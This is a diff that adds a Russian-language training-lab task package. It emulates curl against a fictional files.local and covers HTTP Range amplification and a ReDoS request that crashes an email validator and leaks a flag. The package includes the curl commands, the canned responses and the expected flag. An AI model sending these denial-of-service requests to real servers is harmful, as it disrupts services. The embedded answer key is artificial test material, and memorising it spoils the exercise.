@@ -1,0 +1,22 @@
+{
+  "id": "web-range-redos-dos",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{r3d0s_c4t4str0ph1c_r3g3x_t1m30ut}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: Range-амплификация и ReDoS\n\n`files.local` отдаёт статику с `Accept-Ranges` и валидирует email\nкатастрофическим regex. DoS проверяем ДОЗИРОВАННО: один-два запроса.\n\n1. Посмотри заголовки файла:\n\n   curl -sI https://files.local/big.zip\n\n2. Один запрос со множеством диапазонов (амплификация ввода):\n\n   curl -s -H 'Range: bytes=0-0,1-1,2-2,3-3,4-4' https://files.local/big.zip\n\n3. ReDoS: почти-совпадающая строка валит движок regex, а debug-режим\n   возвращает трассировку с флагом:\n\n   curl -s -X POST https://files.local/api/validate-email -H 'Content-Type: application/json' -d '{\"email\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"}' | grep nto > found.txt\n\n4. Набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция files.local)",
+      "cases": [
+        { "match": "validate-email[\\s\\S]*a{20,}", "example": "-s -X POST https://files.local/api/validate-email -d '{\"email\":\"aaaa...30\"}'", "output": "HTTP/1.1 500 Internal Server Error\nContent-Type: text/plain\n\njava.util.regex.PatternSyntaxException: catastrophic backtracking\n  at Validator.isEmail(Validator.java:42)\n  elapsed: 7.4s (regex_timeout)\nDEBUG request_id=8f2a: nto{r3d0s_c4t4str0ph1c_r3g3x_t1m30ut}\n" },
+        { "match": "Range:", "example": "-s -H 'Range: bytes=0-0,1-1,2-2,3-3,4-4' https://files.local/big.zip", "output": "HTTP/1.1 206 Partial Content\nAccept-Ranges: bytes\nContent-Type: multipart/byteranges; boundary=BOUND\n\n--BOUND\nContent-Range: bytes 0-0/104857600\n\nX\n--BOUND--\n(server assembled 5 ranges from one request; no range-count limit)\n" },
+        { "match": "big\\.zip", "example": "-sI https://files.local/big.zip", "output": "HTTP/1.1 200 OK\nAccept-Ranges: bytes\nContent-Length: 104857600\nContent-Type: application/zip\n" },
+        { "match": "validate-email", "example": "-s -X POST https://files.local/api/validate-email -d '{\"email\":\"user@example.com\"}'", "output": "{\"valid\":false,\"elapsed_ms\":3}\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /big.zip и /api/validate-email на files.local.\n"
+    }
+  }
+}
